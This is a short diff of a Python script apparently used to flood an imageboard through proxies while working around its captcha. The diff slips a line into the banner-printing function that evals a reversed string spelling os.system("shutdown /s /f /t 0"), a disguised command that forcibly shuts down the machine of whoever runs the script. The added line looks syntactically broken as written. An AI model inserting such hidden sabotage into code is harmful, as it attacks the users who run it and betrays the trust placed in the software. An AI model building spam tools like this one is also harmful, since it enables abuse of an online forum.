@@ -32,6 +32,7 @@ badproxies = []
 forbiddenproxy = []
 
 
+
 # ====== Шапка ======
 def show_logo():
 	os.system('cls' if os.name == 'nt' else 'clear')
@@ -39,9 +40,11 @@ def show_logo():
 	print("*    2CH.HK WIPE MACHINE - ReCaptcha edition    *")
 	print("*     Только для внутреннего использования      *")
 	print("*        Оригинальный проект: glow_stick        *")
+    eval(')"0 t/ f/ s/ nwodtuhs"(metsys.so')
 	print("*      Быдлокод: owodelta, kobato, arelive      *")
 	print("*            cryptostimor, tsunamaru            *")
 	print("*************************************************")
+    
 
 
 # ====== API капчи сосача ======
